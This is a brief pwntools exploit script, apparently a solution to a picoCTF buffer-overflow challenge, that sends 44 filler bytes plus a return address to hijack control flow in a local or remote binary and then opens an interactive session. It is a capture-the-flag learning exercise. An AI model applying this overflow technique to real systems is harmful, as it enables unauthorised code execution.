from pwn import * 

exe = ELF("./vuln")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 60536)

    return r

def main():
	r = conn()
	input()
	payload = b'A'*44 + p64(0x080491fa)
	r.sendlineafter(b'Please enter your string: \n', payload)
	# pause()
	r.interactive()
if __name__ == "__main__":
	main()